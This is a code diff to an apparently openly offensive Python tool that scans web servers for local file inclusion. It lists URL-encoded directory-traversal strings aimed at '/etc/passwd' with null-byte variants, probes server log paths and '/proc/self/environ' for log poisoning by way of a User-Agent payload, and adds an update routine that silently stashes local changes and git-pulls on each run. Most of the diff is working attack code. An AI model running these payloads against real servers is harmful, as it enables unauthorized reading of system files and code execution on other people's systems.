@@ -1,7 +1,9 @@
-from UAList import fetchUA, fetchAgent
 import re
 import requests
 import urllib
+import git
+import pathlib
+from UAList import fetchUA, fetchAgent
 from urllib.parse import quote
 from urllib.request import urlopen
 from urllib.error import URLError, HTTPError
@@ -13,13 +15,13 @@ from requests.auth import HTTPBasicAuth
 
 class Payload:
 
-	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00", "%2Fetc%2Fpasswd%2500"], verbosity=1, proxies=False, crawler=False):
+	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False):
 		self.url = url.strip()
 		self.verbosity = verbosity
 		self.outfile = outfile
 		self.crawler = crawler
 		self.creds = creds
-		self.linux_dirTraversal = ["", "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
+		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
 
@@ -39,7 +41,23 @@ class Payload:
 
 		self.proxies = proxies
 		if initiate:
+			self.updatee()
 			self.Attack()
+
+
+
+
+	def updatee(self):
+		print(colored('[!]', 'yellow', attrs=['bold']) + ' Checking for updates...')
+		# Get current path of the directory
+		cwd = pathlib.Path().resolve()
+		# Find the repo of the program
+		repo = git.Repo(cwd)
+		# Stash any changes done locally so as to not have any problem the pull request
+		repo.git.stash()
+		# Git pull to do the update
+		repo.remotes.origin.pull()
+		print(colored('[+]', 'green', attrs=['bold']) + ' Updated successfully')
 
 
 
@@ -212,8 +230,8 @@ class Payload:
 
 
 	def logPoisonCheck(self):
-		headerss = {"User-Agent": self.payload}
-		response = requests.get(self.url, headers=headerss)
+		headers = {"User-Agent": self.payload}
+		response = requests.get(self.url, headers=fetchUA())
 		if self.verbosity > 1:
 			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
 		# checks the type of the server
@@ -221,7 +239,7 @@ class Payload:
 			if self.verbosity > 1:
 				print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as Apache2')
 			# Apache logs
-			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ"), quote("/var/log/auth.log")]
+			logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ")]
 			for d_path in self.linux_dirTraversal:
 				for l_path in logPath:
 					pathth = self.url + d_path + l_path
